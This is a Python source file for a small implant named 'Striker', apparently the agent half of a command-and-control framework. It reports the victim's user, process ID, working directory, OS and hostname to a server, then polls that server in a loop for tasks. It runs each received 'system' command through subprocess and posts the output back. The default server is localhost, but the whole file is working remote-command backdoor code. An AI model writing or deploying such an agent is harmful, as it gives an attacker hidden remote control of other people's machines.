#!/usr/bin/python

import sys, os, subprocess, shlex, requests, json, time

class Striker:

  def __init__(self, hosts):
    self.hosts = hosts
    self.server = {}
    self.config = {}
    self.os = os.name
    self.user = os.getenv("USER")
    self.hostname = "unknown"
    if (os.name in ["posix"]):
      self.os = "linux"
      try:
        self.hostname = open("/etc/hostname").read().strip()
      except:
        pass
    elif (os.name in ["nt"]):
      self.os = "windows"

  def info(self):
    return {
      "user": self.user,
      "pid": os.getpid(),
      "cwd": os.getcwd(),
      "os": self.os,
      "host": self.hostname
    }

  def execTask(self, task):
    print(task)
    taskID = task['uid']
    data = task['data']
    result = "Not implemented!"
    if (task['taskType'] == "system"):
      cmd = data['cmd']
      try:
        proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = proc.stderr.read() + proc.stdout.read()
      except Exception, e:
        result = "Error running task: " + str(e)
    return {"uid":taskID, "result":result}

  def main(self):
    for host in self.hosts:
      if (host['proto'] in ['http', 'https']):
        print("[+] Connecting to %s" %(host['host']));
        baseUrl = host['proto'] + "://" + host['host'] + ":" + str(host['port'])
        try:
          rsp = requests.post(baseUrl + "/agent/init", data=self.info())
          if (rsp.status_code != 200):
            print("[-] Non-200 response code!")
            continue
          data = json.loads(rsp.text);
          print(data)
          self.server = host
          self.config = data
        except Exception, e:
          print("[-] Error: " + str(e))
    if (self.server and self.server['proto'] in ['http', 'https']):
      baseUrl = self.server['proto'] + "://" + self.server['host'] + ":" + str(host['port'])
      uid = self.config['uid']
      delay = int(self.config['delay'])
      while True:
        time.sleep(delay / 1000.0)
        results = []
        rsp = ""
        try:
          rsp = requests.get(baseUrl + "/agent/tasks/" + uid)
        except Exception, e:
          print(str(e))
          continue
        tasks = json.loads(rsp.text)
        for task in tasks:
          taskID = task['uid']
          result = self.execTask(task)
          results.append(result)
        if (len(results) > 0):
          rsp = requests.post(baseUrl + "/agent/tasks/" + uid, json=results)

if __name__ == '__main__':
  striker = Striker([{"proto": "http", "host":"127.0.0.1", "port":3000}])
  striker.main();
